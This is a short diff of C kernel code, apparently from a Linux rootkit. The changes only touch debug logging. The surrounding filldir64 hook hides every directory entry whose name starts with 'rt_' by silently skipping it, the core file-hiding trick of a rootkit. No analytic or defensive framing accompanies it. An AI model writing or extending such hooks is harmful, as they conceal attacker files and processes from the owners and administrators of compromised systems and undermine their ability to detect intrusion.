@@ -349,10 +349,9 @@
  static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
               loff_t offset, u64 ino, unsigned int d_type)
  {
-    printk(KERN_DEBUG "filldir64: name = \"%s\"\n", name);
     // Hide files that start with "rt_"
     if (namlen >= 3 && strncmp(name, "rt_", 3) == 0){
-        printk(KERN_DEBUG "rt_ file found, returning true\n");
+        printk(KERN_DEBUG "filldir64: rt_ file found, returning true\n");
         return true; // Skip this entry (pretend it doesn't exist)
     }
 
